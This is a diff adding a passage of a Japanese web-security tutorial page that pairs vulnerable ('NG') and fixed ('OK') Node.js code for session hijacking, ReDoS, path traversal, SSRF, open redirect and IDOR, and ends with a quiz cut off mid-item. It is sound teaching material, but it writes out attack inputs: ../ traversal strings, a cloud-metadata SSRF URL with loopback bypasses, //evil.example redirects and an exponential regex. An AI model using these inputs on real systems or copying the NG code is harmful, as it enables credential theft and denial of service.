+    <div class="aux"><div class="lv">補助</div><ul><li>引数配列でも、<code>-</code> 始まりの値は<b>オプションとして解釈</b>される（引数インジェクション）。許可リストで検証し、対応コマンドなら <code>--</code> で区切る</li><li>Windows で <code>.bat</code> / <code>.cmd</code> を起動すると cmd.exe が引数を解釈する。避ける</li><li>実行ユーザーの権限を最小に、コンテナで隔離</li></ul></div>
+  </div>
+
+  <!-- ======================== Session ======================== -->
+  <h2 id="session">セッションハイジャック</h2>
+  <p>ログイン後のユーザーは、Cookie の<b>セッション ID だけ</b>で識別されます。ID を手に入れれば、パスワードなしでそのユーザーになりすませます。手に入れる方法ごとに対策が違います。</p>
+
+  <div class="tabs" role="tablist">
+    <button class="tab" role="tab" aria-selected="true" data-panel="ses-ways">盗む方法と対策</button>
+    <button class="tab" role="tab" aria-selected="false" data-panel="ses-fix">セッション固定</button>
+  </div>
+  <div class="panel" id="ses-ways">
+    <div class="tbl"><table>
+      <thead><tr><th>手口</th><th>対策</th></tr></thead>
+      <tbody>
+        <tr><td><b>盗聴</b>: http 通信や SSL ストリップで Cookie を見る</td><td>全ページ https、Cookie に <code>Secure</code>、<a href="security-headers.html#hsts">HSTS</a></td></tr>
+        <tr><td><b>XSS</b>: <code>document.cookie</code> を外部へ送る</td><td><code>HttpOnly</code>、そもそも XSS を潰す</td></tr>
+        <tr><td><b>推測</b>: 連番・時刻・ユーザー ID から ID を当てる</td><td>暗号論的乱数で 128 ビット以上（自作せずフレームワークに任せる）</td></tr>
+        <tr><td><b>固定</b>: 攻撃者が用意した ID でログインさせる</td><td><b>ログイン成功時に ID を作り直す</b>、<code>__Host-</code> 接頭辞</td></tr>
+        <tr><td><b>漏えい</b>: URL に ID が載り、Referer・ログ・共有で漏れる</td><td>ID は Cookie だけで扱い、URL に載せない</td></tr>
+        <tr><td><b>放置</b>: 共有 PC でログアウトし忘れ、盗まれた ID がずっと使える</td><td>無操作タイムアウト・絶対的な有効期限、ログアウトでサーバー側のセッションを破棄</td></tr>
+      </tbody>
+    </table></div>
+  </div>
+  <div class="panel" id="ses-fix" hidden>
+    <ol class="flow">
+      <li>攻撃者がサイトにアクセスし、未ログインのセッション ID <code>ABC</code> を手に入れる</li>
+      <li>被害者のブラウザに <code>ABC</code> を仕込む（脆弱なサブドメインからの Cookie 設定など）</li>
+      <li class="x">被害者がログイン。サーバーが<b>同じ ID <code>ABC</code> のまま</b>ログイン状態にする</li>
+      <li class="x">攻撃者も <code>ABC</code> を持っているので、被害者としてログイン済み</li>
+    </ol>
+    <p class="note">ログイン時に ID を新しく作れば、攻撃者の持つ <code>ABC</code> は無効になる。</p>
+  </div>
+
+  <div class="vs">
+    <div><span class="code-head ng">NG</span>
+<pre><code>app.post('/login', async (req, res) =&gt; {
+  const user = await verify(req.body);
+  if (!user) return res.status(401).end();
+  <span class="cm">// 同じセッション ID のままログイン状態にする</span>
+  <span class="bad">req.session.userId = user.id;</span>
+  res.redirect(<span class="bad">`/home?sid=${req.sessionID}`</span>);
+});</code></pre></div>
+    <div><span class="code-head ok">OK</span>
+<pre><code>app.use(session({
+  name: '__Host-sid',
+  secret: process.env.SESSION_SECRET,
+  cookie: { secure: true, httpOnly: true, sameSite: 'lax',
+            path: '/', maxAge: 30 * 60 * 1000 },
+  rolling: true, <span class="cm">// 操作のたびに期限を延長（無操作 30 分で失効）</span>
+}));
+
+app.post('/login', async (req, res, next) =&gt; {
+  const user = await verify(req.body);
+  if (!user) return res.status(401).end();
+  req.session.<span class="good">regenerate</span>(err =&gt; {  <span class="cm">// 新しい ID を発行</span>
+    if (err) return next(err);
+    req.session.userId = user.id;
+    res.redirect('/home');
+  });
+});
+
+app.post('/logout', (req, res) =&gt;
+  req.session.<span class="good">destroy</span>(() =&gt; res.redirect('/')));</code></pre></div>
+  </div>
+  <p class="note">パスワード変更・メールアドレス変更・送金などの重要操作では、セッションがあっても<b>パスワードやパスキーで再確認</b>すると、ID を盗まれたときの被害を限定できます。</p>
+
+  <!-- ======================== ReDoS ======================== -->
+  <h2 id="redos">ReDoS<span class="en">Regular expression Denial of Service</span></h2>
+  <p>多くの言語の正規表現エンジン（JavaScript・Python・Java・PHP など）は、失敗すると別の分け方を試し直す<b>バックトラック</b>方式です。<code>(a+)+</code> のように<b>量指定子が入れ子</b>になっていると、マッチに失敗する入力で分け方の組み合わせが<b>指数関数的</b>に増えます。</p>
+  <div class="card">
+<pre style="margin:0"><code>/^(a+)+$/.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!')
+<span class="cm">// 末尾の ! で必ず失敗する。そこまでに 'aaa…' を (a+) の繰り返しに
+// 分ける方法は 2^(n-1) 通り。全部試してから false を返す</span></code></pre>
+  </div>
+
+  <div class="card" id="redos-demo">
+    <strong>実際に測ってみる</strong>
+    <p class="note">このブラウザで <code>/^(a+)+$/</code> に「a × n 個 + !」を渡した時間です。重くなりすぎないよう n は 24 までにしています。比較用に、同じ意味の安全な <code>/^a+$/</code> も測ります。</p>
+    <div class="demo-ctrl">
+      <label for="redos-n">最大 n</label>
+      <input type="range" id="redos-n" min="12" max="24" step="2" value="22">
+      <output id="redos-nv">22</output>
+      <button class="btn" id="redos-run">計測する</button>
+    </div>
+    <div class="bars" id="redos-bars"></div>
+    <p id="redos-extra"></p>
+  </div>
+  <div class="card warn-box">
+    <strong>Node.js では特に致命的:</strong> JS の正規表現は同期処理なので、マッチ中は<b>イベントループが止まり、他のすべてのリクエストが待たされます</b>。30 文字程度の入力 1 回で、サーバー全体が数秒〜数分止まります。<code>async</code> にしても try/catch しても防げません。
+  </div>
+
+  <h3>危ない形</h3>
+  <div class="tbl"><table>
+    <thead><tr><th>パターン</th><th>理由</th><th>書き換え例</th></tr></thead>
+    <tbody>
+      <tr><td><code>(a+)+</code> / <code>(\w+)*</code> / <code>(.*)*</code></td><td>量指定子の入れ子</td><td><code>a+</code> / <code>\w*</code></td></tr>
+      <tr><td><code>(\w+\s?)*$</code></td><td><code>\s?</code> が省略できるため、実質 <code>(\w+)*</code></td><td><code>\w+(\s\w+)*$</code></td></tr>
+      <tr><td><code>(a|a)*</code> / <code>(\d|\w)+</code></td><td>選択肢が同じ文字に重なる</td><td>重ならない文字クラスにする</td></tr>
+      <tr><td><code>\s*,\s*</code> を長い入力に繰り返し適用</td><td>指数ではないが多項式時間（n² など）で重くなる</td><td>入力長の上限、split などの単純処理に置き換える</td></tr>
+    </tbody>
+  </table></div>
+  <div class="def">
+    <div class="root"><div class="lv">根本対策</div><ul><li>入れ子・重なりのある正規表現を書かない（<code>eslint-plugin-regexp</code> などの lint で検出）</li><li>ユーザーが正規表現を指定できる機能や重い検証には、<b>線形時間のエンジン</b>（RE2 / Rust の regex / Go の regexp）を使う</li></ul></div>
+    <div class="aux"><div class="lv">補助</div><ul><li>マッチの前に入力長を制限する（メールアドレスなら 254 文字など）</li><li>タイムアウト指定ができる言語では設定する（.NET の <code>matchTimeout</code> など）</li><li>重い処理はワーカーに分け、メインのリクエスト処理を止めない</li></ul></div>
+  </div>
+
+  <!-- ======================== Path traversal ======================== -->
+  <h2 id="path">パストラバーサル<span class="en">Path Traversal</span></h2>
+  <p>ファイル名を入力から受け取ると、<code>../</code> で親ディレクトリにさかのぼり、<b>公開するつもりのないファイル</b>（設定ファイル・秘密鍵・<code>/etc/passwd</code>）を読まれたり、書き込まれたりします。</p>
+  <div class="vs">
+    <div><span class="code-head ng">NG</span>
+<pre><code><span class="cm">// GET /files?name=../../app/.env</span>
+const p = path.join('uploads', <span class="bad">req.query.name</span>);
+res.sendFile(path.resolve(p));
+
+<span class="cm">// 「../ を消す」は回避される
+// ....// → ../ 、%2e%2e%2f 、..\ など</span>
+name.<span class="bad">replace('../', '')</span>;</code></pre></div>
+    <div><span class="code-head ok">OK</span>
+<pre><code>const BASE = path.resolve('uploads');
+
+const target = path.resolve(BASE, req.query.name);
+<span class="cm">// 正規化した結果が BASE の中かを確認</span>
+if (<span class="good">!target.startsWith(BASE + path.sep)</span>) {
+  return res.status(400).end();
+}
+res.sendFile(target);
+
+<span class="cm">// より良い: 名前ではなく ID で引き、実体のパスは DB に持つ</span>
+const [file] = await db.select().from(files)
+  .where(and(eq(files.id, id), eq(files.ownerId, userId)));</code></pre></div>
+  </div>
+  <p class="note"><code>startsWith(BASE)</code> だけだと <code>uploads-secret/</code> のような隣のディレクトリが通るので、末尾に区切り文字を付けて比べます。シンボリックリンクを置ける環境では <code>fs.realpath</code> で実体を確認します。アップロード時の保存名は、ユーザーのファイル名を使わずサーバーで生成します。</p>
+
+  <!-- ======================== SSRF ======================== -->
+  <h2 id="ssrf">SSRF<span class="en">Server-Side Request Forgery</span></h2>
+  <p>「URL を入れると OGP を取ってくる」「Webhook の送信先を登録」「画像を URL から取り込む」など、<b>サーバーが利用者の指定した URL にアクセスする</b>機能を悪用し、外から届かない内部の宛先を叩かせる攻撃です。</p>
+  <ol class="flow">
+    <li>攻撃者が URL に <code>http://169.254.169.254/latest/meta-data/…</code> を指定</li>
+    <li class="x">サーバーがその URL を取得（サーバーからはクラウドのメタデータサービスに届く）</li>
+    <li class="x">一時認証情報などがレスポンスとして攻撃者に返る / 内部の管理画面や DB を操作される</li>
+  </ol>
+  <div class="vs">
+    <div><span class="code-head ng">NG</span>
+<pre><code>app.post('/preview', async (req, res) =&gt; {
+  const r = await fetch(<span class="bad">req.body.url</span>);
+  res.send(await r.text());
+});
+
+<span class="cm">// 文字列チェックは回避される
+// http://127.1/ 、http://[::1]/ 、http://0x7f000001/
+// 外部ドメインが 127.0.0.1 に解決される、
+// 外部 URL から内部へリダイレクトする…</span></code></pre></div>
+    <div><span class="code-head ok">OK</span>
+<pre><code>const ALLOWED = new Set(['api.partner.example', 'cdn.example.com']);
+
+const url = new URL(req.body.url);
+if (url.protocol !== 'https:' || <span class="good">!ALLOWED.has(url.hostname)</span>) {
+  return res.status(400).end();
+}
+const r = await fetch(url, { <span class="good">redirect: 'error'</span> });</code></pre></div>
+  </div>
+  <p>任意の URL を受けるしかない機能（Webhook など）では、許可リストの代わりに次を重ねます。</p>
+  <ul class="list">
+    <li>DNS を解決して得た IP が、プライベート・ループバック・リンクローカル（<code>10/8</code>・<code>127/8</code>・<code>169.254/16</code>・<code>::1</code> など）なら拒否</li>
+    <li>チェックした IP にそのまま接続する（チェック後に再解決させない＝ DNS リバインディング対策）。リダイレクトは追わないか、追うたびに再チェック</li>
+    <li>ネットワーク側で、取得用のサーバー・プロキシから内部への通信を遮断。AWS ならメタデータを IMDSv2（トークン必須）にする</li>
+    <li>取得したレスポンスをそのまま返さない（必要な項目だけ取り出す）</li>
+  </ul>
+
+  <!-- ======================== Open redirect ======================== -->
+  <h2 id="redirect">オープンリダイレクト<span class="en">Open Redirect</span></h2>
+  <p>ログイン後の戻り先 <code>?next=</code> などで、<b>外部サイトへ転送できてしまう</b>問題です。リンクの見た目は正規ドメインなので、フィッシングに使われます。OAuth の <code>redirect_uri</code> と組み合わさると、認可コードやトークンが攻撃者に流れることもあります。</p>
+  <div class="vs">
+    <div><span class="code-head ng">NG</span>
+<pre><code>res.redirect(<span class="bad">req.query.next</span>);
+
+<span class="cm">// 「/ で始まるか」だけでは不十分</span>
+if (next.<span class="bad">startsWith('/')</span>) res.redirect(next);
+<span class="cm">// //evil.example  → プロトコル相対 URL で外部へ
+// /\evil.example  → ブラウザは \ を / と読む</span></code></pre></div>
+    <div><span class="code-head ok">OK</span>
+<pre><code>const ORIGIN = 'https://app.example.com';
+
+function safeNext(next) {
+  if (typeof next !== 'string') return '/';
+  try {
+    const u = new URL(next, ORIGIN);   <span class="cm">// ブラウザと同じ規則で解釈</span>
+    if (<span class="good">u.origin !== ORIGIN</span>) return '/';
+    return u.pathname + u.search + u.hash;
+  } catch {
+    return '/';
+  }
+}
+res.redirect(safeNext(req.query.next));</code></pre></div>
+  </div>
+  <p class="note"><code>new URL()</code> で解釈すると、<code>//evil.example</code> も <code>/\evil.example</code> もオリジンが evil.example になり、<code>javascript:</code> はオリジンが <code>null</code> になるので、まとめて弾けます。</p>
+
+  <!-- ======================== IDOR ======================== -->
+  <h2 id="idor">認可不備 / IDOR<span class="en">Insecure Direct Object Reference</span></h2>
+  <p>ログインしているか（認証）は確認しているのに、<b>そのデータがこのユーザーのものか（認可）</b>を確認していない問題です。URL や JSON の ID を書き換えるだけで、他人の注文・請求書・個人情報が見えます。ツールでは見つけにくく、実際の事故で最も多い種類の 1 つです。</p>
+  <div class="vs">
+    <div><span class="code-head ng">NG</span>
+<pre><code><span class="cm">// GET /api/orders/1024 → 1025 に変えると他人の注文</span>
+app.get('/api/orders/:id', requireLogin, async (req, res) =&gt; {
+  const [order] = await db.select().from(orders)
+    .where(<span class="bad">eq(orders.id, req.params.id)</span>);
+  res.json(order);
+});
+
+<span class="cm">// 受け取った値をそのまま更新に渡す（Mass Assignment）
+// req.body は any なので型チェックも素通りする</span>
+await db.update(users).set(<span class="bad">req.body</span>).where(eq(users.id, me));
+<span class="cm">// → { "role": "admin" } も通る</span></code></pre></div>
+    <div><span class="code-head ok">OK</span>
+<pre><code>import { and, eq } from 'drizzle-orm';
+
+app.get('/api/orders/:id', requireLogin, async (req, res) =&gt; {
+  const [order] = await db.select().from(orders).where(and(
+    eq(orders.id, req.params.id),
+    <span class="good">eq(orders.userId, req.user.id)</span>,
+  ));
+  <span class="cm">// 他人のものは「存在しない」と同じ扱い</span>
+  if (!order) return res.status(404).end();
+  res.json(order);
+});
+
+<span class="cm">// 更新してよい項目だけ取り出す</span>
+const { name, bio } = req.body;
+await db.update(users).set(<span class="good">{ name, bio }</span>).where(eq(users.id, me));</code></pre></div>
+  </div>
+  <ul class="list">
+    <li>ID を UUID にすると推測は難しくなるが、URL の共有やログから漏れれば読める。<b>認可チェックの代わりにはならない</b></li>
+    <li>チェックをハンドラーごとに書くと漏れるので、「必ず所有者で絞るリポジトリ関数」やポリシー層にまとめる</li>
+    <li>一覧・検索・エクスポート・管理用 API など、<b>画面に出ていないエンドポイント</b>も同じ確認が必要</li>
+  </ul>
+
+  <!-- ======================== Myths ======================== -->
+  <h2 id="myths">よくある誤解</h2>
+  <div class="myth">
+    <div class="card"><p class="q">入力時に危険な文字を消しておけば、どこに出しても安全</p><p class="a">安全な形は出力先（HTML・SQL・シェル・URL）ごとに違う。入力では形式の検証、出力では文脈に合わせた分離・エスケープ。</p></div>
+    <div class="card"><p class="q">ORM を使っているので SQL インジェクションはない</p><p class="a">Drizzle なら <code>sql.raw()</code> のように文字列をそのまま埋め込む API に外からの値を渡したときや、並び替え列の受け取りで起きる。</p></div>
+    <div class="card"><p class="q">POST にしたので CSRF は大丈夫</p><p class="a">罠サイトのフォームから POST は送れる。SameSite・トークン・送信元の検証が必要。</p></div>
+    <div class="card"><p class="q">https なのでセッションは盗まれない</p><p class="a">XSS・固定・URL への ID 漏れ・推測しやすい ID は https と関係ない。</p></div>
+    <div class="card"><p class="q">正規表現は小さな処理なので DoS とは無関係</p><p class="a">入れ子の量指定子があると、数十文字の入力で数秒〜数分 CPU を占有する。</p></div>
+  </div>
+
+  <!-- memo:quiz（scripts/memo.py が自動生成。手で編集しない） -->
+<section id="memo-quiz-ui" hidden aria-labelledby="memo-quiz-title">
+<style>
+#memo-quiz-ui{--mq-ok:#1a7f37;--mq-ng:#cf222e;max-width:880px;margin:48px auto 0;padding:0 0 8px;color:var(--fg,inherit);font-size:15px;line-height:1.7}
+@media (prefers-color-scheme:dark){#memo-quiz-ui{--mq-ok:#3fb950;--mq-ng:#f85149}}
+#memo-quiz-ui *{box-sizing:border-box}
+#memo-quiz-ui h2{display:flex;align-items:baseline;gap:10px;margin:0 0 14px;padding:0 0 0 10px;border:0;border-left:3px solid var(--accent,currentColor);font-size:1.1rem;font-weight:700;color:inherit;background:none}
+#memo-quiz-ui h2 small{font-size:.75rem;font-weight:400;color:var(--fg-2,inherit);opacity:.9}
+#memo-quiz-ui .mq-q{margin:0 0 12px;padding:14px 16px;background:var(--surface,rgba(127,127,127,.06));border:1px solid var(--line,rgba(127,127,127,.3));border-radius:10px}
+#memo-quiz-ui .mq-prompt{margin:0 0 10px;font-weight:700}
+#memo-quiz-ui .mq-choices{display:flex;flex-direction:column;gap:6px}
+#memo-quiz-ui .mq-c{display:block;width:100%;text-align:left;padding:8px 12px;border:1px solid var(--line,rgba(127,127,127,.3));border-radius:8px;background:var(--chip,rgba(127,127,127,.1));color:inherit;font:inherit;font-size:.9rem;line-height:1.5;cursor:pointer}
+#memo-quiz-ui .mq-c:hover:not(:disabled){border-color:var(--accent,currentColor)}
+#memo-quiz-ui .mq-c:disabled{cursor:default;opacity:.6}
+#memo-quiz-ui .mq-c.mq-ok{opacity:1;border-color:var(--mq-ok);box-shadow:inset 3px 0 0 var(--mq-ok)}
+#memo-quiz-ui .mq-c.mq-ng{opacity:1;border-color:var(--mq-ng);box-shadow:inset 3px 0 0 var(--mq-ng)}
+#memo-quiz-ui .mq-fb{margin:10px 0 0;font-size:.85rem;color:var(--fg-2,inherit)}
+#memo-quiz-ui .mq-ref{color:var(--accent,inherit);font-weight:700;text-decoration:none;white-space:nowrap}
+#memo-quiz-ui .mq-ref:hover{text-decoration:underline}
+#memo-quiz-ui .mq-result{margin:4px 0 12px;padding:16px 18px;background:var(--surface,rgba(127,127,127,.06));border:1px solid var(--accent,rgba(127,127,127,.3));border-radius:10px}
+#memo-quiz-ui .mq-score{margin:0 0 10px;font-size:.9rem;color:var(--fg-2,inherit)}
+#memo-quiz-ui .mq-score b{font:700 1.4rem/1.2 ui-monospace,Menlo,monospace;color:var(--accent,inherit)}
+#memo-quiz-ui .mq-review{margin:0;padding:0;list-style:none;display:flex;flex-direction:column;gap:8px}
+#memo-quiz-ui .mq-review li{padding:8px 0 0;border-top:1px solid var(--line,rgba(127,127,127,.3));font-size:.85rem}
+#memo-quiz-ui .mq-rv-q{font-weight:700}
+#memo-quiz-ui .mq-rv-a{color:var(--fg-2,inherit)}
+#memo-quiz-ui b.ok{color:var(--mq-ok)}
+#memo-quiz-ui b.ng{color:var(--mq-ng)}
+.mq-flash{outline:3px solid var(--accent,#0077b6)!important;outline-offset:4px;border-radius:4px}
+#memo-quiz-ui .mq-reset{margin-top:4px;padding:4px 12px;border:1px solid var(--line,rgba(127,127,127,.3));border-radius:999px;background:none;color:var(--fg-2,inherit);font:600 12px/1.4 ui-monospace,Menlo,monospace;cursor:pointer}
+#memo-quiz-ui .mq-reset:hover{color:var(--accent,inherit);border-color:var(--accent,currentColor)}
+</style>
+<h2 id="memo-quiz-title">確認クイズ <small></small></h2>
+<div class="mq-list"></div>
+<div class="mq-result" hidden aria-live="polite"></div>
+<button type="button" class="mq-reset">やり直す</button>
+</section>
+<script>
+// 問題データ（#memo-quiz）がこのブロックより後ろにあってもよいよう、読み込み後に実行する
+(function (run) {
+  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', run);
+  else run();
+})(function () {
+  var data = document.getElementById('memo-quiz');
+  var ui = document.getElementById('memo-quiz-ui');
+  if (!data || !ui) return;
+  var qs;
+  try { qs = JSON.parse(data.textContent); } catch (e) { return; }
+  if (!Array.isArray(qs)) return;
+  qs = qs.filter(function (q) {
+    return q && typeof q.q === 'string' && Array.isArray(q.choices) &&
+      typeof q.answer === 'number' && q.choices[q.answer] !== undefined;
+  });
+  if (!qs.length) return;
+  var list = ui.querySelector('.mq-list');
+  var score = ui.querySelector('h2 small');
+  var result = ui.querySelector('.mq-result');
+  var picks = [];
+  function el(tag, cls, text) {
+    var e = document.createElement(tag);
+    if (cls) e.className = cls;
+    if (text != null) e.textContent = text;
+    return e;
+  }
+  // ---- 本文の該当箇所へ移動する。飛び先が閉じたタブや <details> の中なら先に開く
+  function isShown(e) { return !!(e.offsetParent || e.getClientRects().length); }
+  function controlFor(id) {
+    var esc = window.CSS && CSS.escape ? CSS.escape(id) : id;
+    var c = document.querySelector('[data-panel="' + esc + '"],[aria-controls="' + esc + '"],[data-target="#' + esc + '"],[href="#' + esc + '"]:not(.mq-ref)');
+    if (c) return c;
+    // onclick="switchTab('layers')" のように id の一部を渡すタブにも対応
+    var keys = [id, id.replace(/^(panel|tab)[-_]/, '')];
+    var all = document.querySelectorAll('[onclick]');
+    for (var i = 0; i < all.length; i++) {
+      var code = all[i].getAttribute('onclick');
+      for (var k = 0; k < keys.length; k++) {
+        if (code.indexOf("'" + keys[k] + "'") >= 0 || code.indexOf('"' + keys[k] + '"') >= 0) return all[i];
+      }
+    }
+    return null;
+  }
+  function reveal(target) {
+    var chain = [];
+    for (var e = target; e && e !== document.body; e = e.parentElement) chain.unshift(e);
+    chain.forEach(function (e) {
+      if (e.tagName === 'DETAILS' && !e.open && e !== target) e.open = true;
+      if (isShown(e)) return;
+      var c = e.id && controlFor(e.id);
+      if (c) c.click();
+      if (!isShown(e) && e.hidden) e.hidden = false;
+    });
+  }
+  function jump(id, smooth) {
+    var target = document.getElementById(id);
+    if (!target) return false;
+    reveal(target);
+    // 遠い飛び先までゆっくりスクロールすると待たされるので、画面 2 枚分より遠ければ一気に移動する
+    var far = Math.abs(target.getBoundingClientRect().top) > innerHeight * 2;
+    target.scrollIntoView({ behavior: smooth && !far ? 'smooth' : 'auto', block: 'start' });
+    target.classList.add('mq-flash');
+    setTimeout(function () { target.classList.remove('mq-flash'); }, 1800);
+    return true;
+  }
+  // 本文の該当箇所（ref = "#id"）へのリンク
+  function refLink(q, label) {
+    if (typeof q.ref !== 'string' || !/^#[\w-]+$/.test(q.ref)) return null;
+    var id = q.ref.slice(1);
+    if (!document.getElementById(id)) return null;
+    var a = el('a', 'mq-ref', label);
+    a.href = q.ref;
+    a.addEventListener('click', function (ev) {
+      ev.preventDefault();
+      if (history.replaceState) history.replaceState(null, '', q.ref);
+      jump(id, true);
+    });
+    return a;
+  }
+  // クイズページなど他のページから page.html#id で来たとき
+  if (/^#[\w-]+$/.test(location.hash) && location.hash !== '#memo-quiz-ui') {
+    var initial = location.hash.slice(1);
+    setTimeout(function () { jump(initial, false); }, 0);
+  }
+  function count() {
+    var done = 0, ok = 0;
+    picks.forEach(function (p, i) { if (p != null) { done++; if (p === qs[i].answer) ok++; } });
+    return { done: done, ok: ok };
+  }
+  function showResult() {
+    var c = count();
+    result.textContent = '';
+    var head = el('p', 'mq-score');
+    head.appendChild(el('b', null, c.ok + ' / ' + qs.length));
+    head.appendChild(document.createTextNode(' 問正解' +
+      (c.ok === qs.length ? ' 🎉 全問正解！' : '（間違えた問題は本文で確認できます）')));
+    result.appendChild(head);
+    var ol = el('ol', 'mq-review');
+    qs.forEach(function (q, i) {
+      var ok = picks[i] === q.answer;
+      var li = el('li', ok ? 'ok' : 'ng');
+      var top = el('div', 'mq-rv-q');
+      top.appendChild(el('b', ok ? 'ok' : 'ng', ok ? '⭕' : '❌'));
+      top.appendChild(document.createTextNode(' Q' + (i + 1) + '. ' + q.q));
+      li.appendChild(top);
+      var ans = el('div', 'mq-rv-a');
+      ans.appendChild(document.createTextNode('正解: ' + q.choices[q.answer]));
+      if (!ok) ans.appendChild(document.createTextNode(' ／ あなたの答え: ' + q.choices[picks[i]]));
+      li.appendChild(ans);
+      if (!ok) {
+        var link = refLink(q, '本文で確認する →');
+        if (link) li.appendChild(link);
+      }
+      ol.appendChild(li);
+    });
+    result.appendChild(ol);
+    result.hidden = false;
+  }
+  function update() {
+    var c = count();
+    score.textContent = c.done ? c.ok + ' / ' + c.done + ' 問正解' + (c.done < qs.length ? '（残り ' + (qs.length - c.done) + ' 問）' : '') : '全 ' + qs.length + ' 問';
+    if (c.done === qs.length) showResult();
+  }
+  function render() {
+    list.textContent = '';
+    result.hidden = true;
+    picks = qs.map(function () { return null; });
+    qs.forEach(function (q, i) {
+      var box = el('div', 'mq-q');
+      box.appendChild(el('p', 'mq-prompt', 'Q' + (i + 1) + '. ' + q.q));
+      var ch = el('div', 'mq-choices');
+      var fb = el('p', 'mq-fb');
+      fb.hidden = true;
+      q.choices.forEach(function (c, j) {
+        var b = el('button', 'mq-c', c);
+        b.type = 'button';
+        b.addEventListener('click', function () {
+          var ok = j === q.answer;
+          Array.prototype.forEach.call(ch.children, function (x, k) {
+            x.disabled = true;
+            if (k === q.answer) x.classList.add('mq-ok');
+          });
+          if (!ok) b.classList.add('mq-ng');
+          fb.textContent = '';
+          fb.appendChild(el('b', ok ? 'ok' : 'ng', ok ? '⭕ 正解' : '❌ 不正解'));
+          fb.appendChild(document.createTextNode(
+            (ok ? '' : '（正解: ' + q.choices[q.answer] + '）') + (q.explain ? ' ' + q.explain : '')));
+          if (!ok) {
+            var link = refLink(q, '本文で確認する →');
+            if (link) { fb.appendChild(document.createTextNode(' ')); fb.appendChild(link); }
+          }
+          fb.hidden = false;
+          picks[i] = j;
+          update();
+        });
+        ch.appendChild(b);
+      });
+      box.appendChild(ch);
+      box.appendChild(fb);
+      list.appendChild(box);
+    });
+    update();
+  }
+  ui.querySelector('.mq-reset').addEventListener('click', function () {
+    render();
+    ui.scrollIntoView({ behavior: 'smooth', block: 'start' });
+  });
+  render();
+  ui.hidden = false;
+});
+</script>
+<!-- /memo:quiz -->
+<footer id="memo-backlink"><a href="index.html">&larr; 一覧に戻る</a></footer>
+</div>
+
+<script>
+document.querySelectorAll('.tabs').forEach(group => {
+  group.addEventListener('click', e => {
+    const tab = e.target.closest('.tab');
+    if (!tab) return;
+    group.querySelectorAll('.tab').forEach(t => {
+      const on = t === tab;
+      t.setAttribute('aria-selected', String(on));
+      document.getElementById(t.dataset.panel).hidden = !on;
+    });
+  });
+});
+
+/* ---- ReDoS 計測デモ ---- */
+(() => {
+  const range = document.getElementById('redos-n');
+  const out = document.getElementById('redos-nv');
+  const btn = document.getElementById('redos-run');
+  const bars = document.getElementById('redos-bars');
+  const extra = document.getElementById('redos-extra');
+  range.addEventListener('input', () => { out.value = range.value; });
+
+  const evil = /^(a+)+$/;
+  const safe = /^a+$/;
+  const time = (re, n) => {
+    const s = 'a'.repeat(n) + '!';
+    const t = performance.now();
+    re.test(s);
+    return performance.now() - t;
+  };
+  const fmt = ms => ms < 1 ? ms.toFixed(2) + ' ms' : ms < 1000 ? ms.toFixed(0) + ' ms' : (ms / 1000).toFixed(1) + ' s';
+  const human = ms => {
+    const s = ms / 1000;
+    if (s < 60) return s.toFixed(0) + ' 秒';
+    if (s < 3600) return (s / 60).toFixed(0) + ' 分';
+    if (s < 86400) return (s / 3600).toFixed(0) + ' 時間';
+    return (s / 86400).toFixed(0) + ' 日';
+  };
+
+  function row(label, ms, max, cls) {
+    const r = document.createElement('div');
+    r.className = 'bar-row' + (cls ? ' ' + cls : '');
+    const l = document.createElement('span'); l.textContent = label;
+    const tr = document.createElement('div'); tr.className = 'track';
+    const f = document.createElement('div'); f.className = 'fill';
+    tr.append(f);
+    const m = document.createElement('span'); m.className = 'ms'; m.textContent = fmt(ms);
+    r.append(l, tr, m);
+    bars.append(r);
+    requestAnimationFrame(() => { f.style.width = Math.max(0.5, ms / max * 100) + '%'; });
+  }
+
+  btn.addEventListener('click', async () => {
+    btn.disabled = true;
+    bars.textContent = '';
+    extra.textContent = '計測中…';
+    const maxN = Number(range.value);
+    const results = [];
+    for (let n = 10; n <= maxN; n += 2) {
+      await new Promise(r => setTimeout(r, 30)); // 画面を更新させる
+      results.push([n, time(evil, n)]);
+    }
+    const safeMs = time(safe, 100000);
+    const max = Math.max(...results.map(r => r[1]), 1);
+    results.forEach(([n, ms]) => row('n=' + n, ms, max));
+    row('安全版', safeMs, max, 'safe');
+    const [lastN, lastMs] = results[results.length - 1];
+    const est = n => lastMs * Math.pow(2, n - lastN);
+    extra.textContent = `n が 2 増えるごとに約 4 倍。このまま伸ばすと n=30 で約 ${human(est(30))}、n=40 で約 ${human(est(40))} の見込み（目安）。安全版の /^a+$/ は 10 万文字でも ${fmt(safeMs)}。`;
+    btn.disabled = false;
+  });
+})();
+</script>
+
+<!-- 確認クイズ（問題データだけ書く。表示は memo.py がページ末尾に自動で入れる） -->
+<script type="application/json" id="memo-quiz">
+[
+  {
+    "q": "一覧 API で ?sort=price のように並び替え列を受け取り、SQL の ORDER BY に入れたい。安全なのは？",
+    "choices": ["ORDER BY $1 としてプレースホルダで渡す", "受け取った値から ' と ; を取り除いてから埋め込む", "受け取った値をキーに、許可した列名と並び順の対応表から選んで埋め込む", "ORM を使っているので、そのまま渡してよい"],
+    "answer": 2,
+    "explain": "列名や ASC/DESC はプレースホルダにできない（値として扱われる）。拒否リストでの除去は回避されうるので、許可リストから選ぶ。",
+    "ref": "#sqli"
+  },
+  {
+    "q": "攻撃者が用意したセッション ID のまま被害者にログインさせ、乗っ取る攻撃を防ぐには？",
+    "choices": ["ログイン成功時にセッション ID を新しく作り直す", "セッション Cookie に HttpOnly を付ける", "セッション ID を URL にも載せて照合する", "ログイン画面だけ https にする"],
+    "answer": 0,
+    "explain": "セッション固定攻撃は、ログイン前後で ID が変わらないことを利用する。再生成すれば攻撃者の持つ ID は無効になる。",
+    "ref": "#session"
+  },
+  {
+    "q": "Node.js で exec(`ping -c 1 ${host}`) を execFile('ping', ['-c', '1', host]) に変えると安全になる主な理由は？",
+    "choices": ["execFile は非同期なので攻撃の影響が小さい", "execFile は自動で入力をエスケープしてくれる", "execFile は実行時間に上限がある", "シェルを起動しないので、; や | や $() がコマンドの区切りとして解釈されない"],
+    "answer": 3,
+    "explain": "exec は sh -c で文字列を解釈する。execFile は引数を配列のまま渡すので、シェルの記号はただの文字になる。ただし - で始まる値のオプション解釈は別途検証が必要。",
+    "ref": "#oscmd"
+  },
+  {
+    "q": "Node.js の API でユーザー入力を /^(\\w+\\s?)*$/ で検証していて、短い入力でサーバー全体が固まった。有効な対策は？",
